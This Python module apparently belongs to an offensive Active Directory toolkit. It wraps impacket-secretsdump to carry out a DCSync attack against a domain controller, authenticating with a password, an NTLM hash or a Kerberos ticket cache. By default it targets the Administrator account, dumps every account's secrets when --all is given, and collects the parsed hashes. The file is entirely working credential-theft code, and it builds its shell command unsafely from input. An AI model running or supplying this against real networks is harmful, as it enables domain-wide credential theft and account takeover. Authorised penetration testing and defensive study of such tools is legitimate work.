import subprocess
import os
from modules.parse.hash import parse_line

def run(data, cred, args):
    domain = data.get("domain")
    ip = data.get("ip")
    user = cred.get("user")
    secret = cred.get("secret")
    cred_type = cred.get("type")

    if not domain or not ip:
        print("[-] Missing domain or DC IP")
        return None

    # --- FLAG DETECTION ---
    # We check BOTH the argparse attribute AND the raw extra list
    extra = getattr(args, "extra", []) or []
    
    is_all = getattr(args, "all", False) or "--all" in extra
    
    # Target logic: 
    # 1. Use --user if provided
    # 2. Use first extra arg if it isn't a flag
    # 3. Default to Administrator
    target_user = getattr(args, "user", None)
    if not target_user:
        pos_args = [x for x in extra if not x.startswith("-")]
        target_user = pos_args[0] if pos_args else "Administrator"

    # --- AUTH ---
    env = os.environ.copy()
    if cred_type == "password":
        auth = f"{domain}/{user}:{secret}@{ip}"
    elif cred_type == "ntlm":
        auth = f"-hashes :{secret} {domain}/{user}@{ip}"
    elif cred_type == "ccache":
        auth = f"-k -no-pass {domain}/{user}@{ip}"
        env["KRB5CCNAME"] = secret
    else:
        return None

    # --- CMD BUILD ---
    # If is_all is true, we remove the -just-dc-user filter
    if is_all:
        cmd = f"impacket-secretsdump {auth}"
    else:
        cmd = f"impacket-secretsdump -just-dc-user {target_user} {auth}"

    print(f"[*] Running: {cmd}\n")

    # --- EXECUTION ---
    found = []
    try:
        with subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env) as proc:
            for line in proc.stdout:
                print(line, end="") 
                parsed = parse_line(line.strip())
                if parsed:
                    found.append(parsed)
        return found
    except Exception as e:
        print(f"[-] DCSync failed: {e}")
        return None